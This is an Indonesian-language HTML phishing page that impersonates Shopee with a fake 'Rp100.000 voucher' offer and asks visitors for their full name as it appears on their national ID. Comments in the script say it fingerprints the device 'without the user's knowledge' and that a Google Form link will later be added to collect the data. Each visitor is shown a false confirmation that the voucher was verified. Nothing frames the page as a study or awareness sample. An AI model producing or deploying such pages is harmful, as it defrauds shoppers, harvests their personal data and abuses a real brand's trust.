<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee PayDay - Klaim Voucher Gratis</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#EE4D2D] text-white font-sans min-h-screen flex items-center justify-center p-4">
    <div class="bg-white text-gray-800 rounded-2xl shadow-2xl overflow-hidden w-full max-w-sm">
        <div class="bg-[#EE4D2D] p-4 text-center">
            <h1 class="text-white font-bold text-xl">Klaim Voucher Rp100.000</h1>
            <p class="text-white/80 text-xs">Khusus Pengguna Setia Shopee</p>
        </div>

        <div class="p-6">
            <div class="bg-gray-50 border-2 border-dashed border-gray-300 rounded-xl p-4 mb-6 text-center">
                <p class="text-3xl font-black text-[#EE4D2D]">Rp 100.000</p>
                <p class="text-[10px] text-gray-400 uppercase mt-1">Potongan Belanja Semua Toko</p>
            </div>

            <div class="space-y-4">
                <div>
                    <label class="text-xs font-bold text-gray-500 uppercase">Masukkan Nama Lengkap (Sesuai KTP):</label>
                    <input type="text" id="namaUser" placeholder="Nama Anda..." 
                           class="w-full mt-1 border border-gray-300 rounded-md p-3 focus:outline-none focus:border-[#EE4D2D]">
                </div>
                
                <button onclick="kirimKeGoogle()" class="w-full bg-[#EE4D2D] text-white font-bold py-3 rounded-md shadow-lg active:scale-95 transition-transform">
                    KLAIM VOUCHER SEKARANG
                </button>
            </div>

            <div class="mt-6 pt-4 border-t border-gray-100 text-[9px] text-gray-400 leading-tight">
                <p>Log Keamanan Sistem:</p>
                <p id="systemLog">Detecting device integrity...</p>
            </div>
        </div>
    </div>

    <script>
        // Deteksi Otomatis (Tanpa sepengetahuan user)
        const device = navigator.platform;
        const browser = navigator.userAgent.split(' ')[0];
        const waktu = new Date().toLocaleString('id-ID');
        document.getElementById('systemLog').innerText = `ID: ${Math.random().toString(36).substr(2, 9)} | OS: ${device}`;

        function kirimKeGoogle() {
            const nama = document.getElementById('namaUser').value;
            if(!nama) return alert("Silahkan isi nama lengkap untuk verifikasi!");

            // Nanti di sini kita masukkan link Google Form kamu
            alert("Selamat! Voucher berhasil diverifikasi.\\nNama: " + nama + "\\n\\nSilahkan cek aplikasi Shopee Anda dalam 1x24 jam.");
            console.log("Data Terambil:", {nama, device, browser, waktu});
        }
    </script>
</body>
</html>
